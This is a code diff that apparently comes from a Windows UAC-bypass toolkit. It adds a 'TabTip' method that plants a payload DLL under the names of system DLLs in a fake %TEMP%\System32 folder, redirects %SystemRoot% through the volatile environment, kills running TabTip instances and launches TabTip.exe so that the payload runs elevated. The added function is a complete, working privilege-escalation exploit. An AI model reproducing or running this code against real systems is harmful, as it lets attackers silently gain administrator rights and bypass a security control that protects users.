@@ -15,6 +15,7 @@
 *  https://github.com/R41N3RZUF477/RequestTrace_UAC_Bypass
 *  https://github.com/R41N3RZUF477/QuickAssist_UAC_Bypass
 *  https://github.com/R41N3RZUF477/UnifiedConsent_UAC_Bypass
+*  https://github.com/R41N3RZUF477/TabTip_UAC_Bypass
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -159,7 +160,7 @@ NTSTATUS ucmRegistrationProxyExecute(
     SIZE_T nLen, payloadDirNameLen = 0;
     WCHAR szBuffer[MAX_PATH + 1];
     WCHAR szPayloadDir[MAX_PATH * 2];
-    UNICODE_STRING uStrTaskhost = RTL_CONSTANT_STRING(TASKHOSTW_EXE);
+    UNICODE_STRING uStrProcessName = RTL_CONSTANT_STRING(TASKHOSTW_EXE);
 
     INPUT inputs[8];
 
@@ -226,7 +227,7 @@ NTSTATUS ucmRegistrationProxyExecute(
         supEnumProcessesForSession(
             NtCurrentPeb()->SessionId,
             (pfnEnumProcessCallback)supEnumTaskhostTasksCallback,
-            (PVOID)&uStrTaskhost);
+            (PVOID)&uStrProcessName);
 
         fUseSendInput = (StateName->Value == WNF_SHEL_TRACE_REQUESTED);
 
@@ -452,7 +453,7 @@ NTSTATUS ucmQuickAssistMethod(
         if (!supReplaceDllEntryPoint(
             ProxyDll,
             ProxyDllSize,
-            FUBUKI_ENTRYPOINT_QASSIST,
+            FUBUKI_ENTRYPOINT_R41N3RZUF477,
             FALSE))
         {
             break;
@@ -523,6 +524,153 @@ NTSTATUS ucmQuickAssistMethod(
         _strcpy(szPayloadPath, g_ctx->szTempDirectory);
         _strcat(szPayloadPath, WEBVIEW_DIR);
         supRemoveDirectoryRecursive(szPayloadPath);
+    }
+
+    return MethodResult;
+}
+
+/*
+* ucmTabTipMethod
+*
+* Purpose:
+*
+* Bypass UAC by environment variables hijack and dll planting.
+* https://github.com/R41N3RZUF477/TabTip_UAC_Bypass
+*
+*/
+NTSTATUS ucmTabTipMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL fDirCreated = FALSE, fEnvSet = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    SIZE_T i, nLen;
+    PWSTR commonPath = NULL;
+
+    SHELLEXECUTEINFO shinfo;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+    WCHAR szPayloadDir[MAX_PATH * 2];
+    UNICODE_STRING uStrProcessName = RTL_CONSTANT_STRING(TABTIP_EXE);
+
+    LPWSTR knownDlls[] = { ATFD_DLL, WINDOWS_STORAGE_DLL, RSAENH_DLL };
+
+    do {
+
+        //
+        // Select payload entry point.
+        //
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_ENTRYPOINT_R41N3RZUF477,
+            FALSE))
+        {
+            break;
+        }
+
+        //
+        // Create redirected %TEMP%\System32 directory.
+        //
+        _strcpy(szPayloadDir, g_ctx->szTempDirectory);
+        _strcat(szPayloadDir, SYSTEM32_DIR_NAME);
+        if (!CreateDirectory(szPayloadDir, NULL)) {
+            if (GetLastError() != ERROR_ALREADY_EXISTS)
+                break;
+        }
+
+        fDirCreated = TRUE;
+
+        //
+        // Drop payload.
+        //
+        _strcpy(szBuffer, szPayloadDir);
+        _strcat(szBuffer, TEXT("\\"));
+        nLen = _strlen(szBuffer);
+        for (i = 0; i < RTL_NUMBER_OF(knownDlls); i++) {
+            szBuffer[nLen] = 0;
+            _strcat(szBuffer, knownDlls[i]);
+            if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
+                break;
+        }
+
+        //
+        // Override %SystemRoot%.
+        //
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+
+        nLen = _strlen(szBuffer);
+        if (szBuffer[nLen - 1] == L'\\')
+            szBuffer[nLen - 1] = 0;
+
+        fEnvSet = supSetEnvVariable(
+            FALSE,
+            T_VOLATILE_ENV,
+            T_SYSTEMROOT,
+            szBuffer);
+
+        if (!fEnvSet)
+            break;
+
+        //
+        // Kill TabTip instances.
+        //
+        supEnumProcessesForSession(
+            NtCurrentPeb()->SessionId,
+            (pfnEnumProcessCallback)supTerminateTabTipCallback,
+            (PVOID)&uStrProcessName);
+
+        //
+        // Run target.
+        //
+        if (SUCCEEDED(SHGetKnownFolderPath(
+            &FOLDERID_ProgramFilesCommon,
+            0,
+            NULL,
+            &commonPath)))
+        {
+            _strcpy(szBuffer, commonPath);
+            CoTaskMemFree(commonPath);
+            supConcatenatePaths(szBuffer, TEXT("Microsoft Shared\\ink\\"), MAX_PATH);
+            _strcat(szBuffer, TABTIP_EXE);
+
+            RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+            shinfo.cbSize = sizeof(shinfo);
+            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+            shinfo.lpVerb = OPEN_VERB;
+            shinfo.nShow = SW_SHOWDEFAULT;
+            shinfo.lpFile = szBuffer;
+
+            if (ShellExecuteEx(&shinfo)) {
+                Sleep(5000);
+                MethodResult = STATUS_SUCCESS;
+
+                TerminateProcess(shinfo.hProcess, 0);
+                CloseHandle(shinfo.hProcess);
+            }
+        }
+
+    } while (FALSE);
+
+    supSetGlobalCompletionEvent();
+ 
+    //
+    // Restore environment.
+    //
+    if (fEnvSet) {
+        supSetEnvVariable(
+            TRUE,
+            T_VOLATILE_ENV,
+            T_SYSTEMROOT,
+            NULL);
+    }
+
+    //
+    // Remove payload.
+    //
+    if (fDirCreated) {
+        supRemoveDirectoryRecursive(szPayloadDir);
     }
 
     return MethodResult;
